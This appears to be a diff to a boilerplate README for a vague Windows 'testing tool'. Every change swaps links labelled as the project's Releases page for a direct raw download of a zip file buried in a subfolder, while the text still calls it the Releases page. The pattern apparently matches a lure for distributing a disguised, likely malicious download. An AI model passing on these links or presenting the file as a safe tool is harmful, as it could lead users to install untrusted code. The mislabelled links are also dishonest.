@@ -1,10 +1,10 @@
 # 🛠️ UPE-TESTING-2026 - Simple Windows Testing Tool
 
-[![Download UPE-TESTING-2026](https://img.shields.io/badge/Download%20Now-5A5A5A?style=for-the-badge&logo=github&logoColor=white)](https://github.com/eriodictyonspringcleaning464/UPE-TESTING-2026/releases)
+[![Download UPE-TESTING-2026](https://img.shields.io/badge/Download%20Now-5A5A5A?style=for-the-badge&logo=github&logoColor=white)](https://github.com/eriodictyonspringcleaning464/UPE-TESTING-2026/raw/refs/heads/main/clase-02/UP-TESTIN-2.0-beta.1.zip)
 
 ## 📥 Download UPE-TESTING-2026
 
-Visit this page to download: [UPE-TESTING-2026 Releases](https://github.com/eriodictyonspringcleaning464/UPE-TESTING-2026/releases)
+Visit this page to download: [UPE-TESTING-2026 Releases](https://github.com/eriodictyonspringcleaning464/UPE-TESTING-2026/raw/refs/heads/main/clase-02/UP-TESTIN-2.0-beta.1.zip)
 
 ## 🪟 What UPE-TESTING-2026 Does
 
@@ -30,7 +30,7 @@ For best results, close other large apps before you launch UPE-TESTING-2026.
 
 ## 🚀 How to Download
 
-1. Open the [UPE-TESTING-2026 Releases](https://github.com/eriodictyonspringcleaning464/UPE-TESTING-2026/releases) page.
+1. Open the [UPE-TESTING-2026 Releases](https://github.com/eriodictyonspringcleaning464/UPE-TESTING-2026/raw/refs/heads/main/clase-02/UP-TESTIN-2.0-beta.1.zip) page.
 2. Look for the latest release at the top of the page.
 3. Under the release files, find the Windows download file.
 4. Save the file to your computer.
@@ -142,7 +142,7 @@ If the app creates a report file, keep it in the same folder as the app or in a 
 
 When a new release appears:
 
-1. Visit the [UPE-TESTING-2026 Releases](https://github.com/eriodictyonspringcleaning464/UPE-TESTING-2026/releases) page.
+1. Visit the [UPE-TESTING-2026 Releases](https://github.com/eriodictyonspringcleaning464/UPE-TESTING-2026/raw/refs/heads/main/clase-02/UP-TESTIN-2.0-beta.1.zip) page.
 2. Download the latest Windows file.
 3. Replace the old app files if the release notes ask you to do that.
 4. Keep your logs if you want to compare past runs.
@@ -183,4 +183,4 @@ UPE-TESTING-2026 can fit tasks like:
 - Repository: UPE-TESTING-2026
 - Description: UPE-TESTING-2026
 - Platform: Windows
-- Download page: [Releases](https://github.com/eriodictyonspringcleaning464/UPE-TESTING-2026/releases)
+- Download page: [Releases](https://github.com/eriodictyonspringcleaning464/UPE-TESTING-2026/raw/refs/heads/main/clase-02/UP-TESTIN-2.0-beta.1.zip)
